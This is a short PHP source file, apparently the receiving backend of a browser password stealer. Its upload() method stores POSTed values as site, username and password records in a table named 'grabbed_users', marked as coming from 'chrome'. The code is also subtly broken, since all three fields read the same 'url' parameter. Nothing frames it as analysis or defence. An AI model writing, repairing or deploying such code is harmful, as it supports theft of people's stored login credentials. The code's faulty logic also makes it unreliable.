<?php

class Recovery
{


    public function upload()
    {

        if(!empty($_POST["url"])){
            $application = "chrome";
            $userName =$_POST["url"];
            $passWord = $_POST["url"];
            $site = $_POST["url"];


            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM grabbed_users WHERE site = :site AND username = :username AND password = :password");
            $result = $statement->execute(array('site' => $site,'username' =>$userName,'password' =>$passWord));
            $user = $statement->fetch();

            if($user == false) {
                $statement = $GLOBALS["pdo"]->prepare("INSERT INTO grabbed_users (site, username, password) VALUES (:site, :username, :password)");
                $result = $statement->execute(array('site' => $site, 'username' => $userName, 'password' => $passWord));
            }

        }

        //var_dump($detailsArray);
        die();
    }


}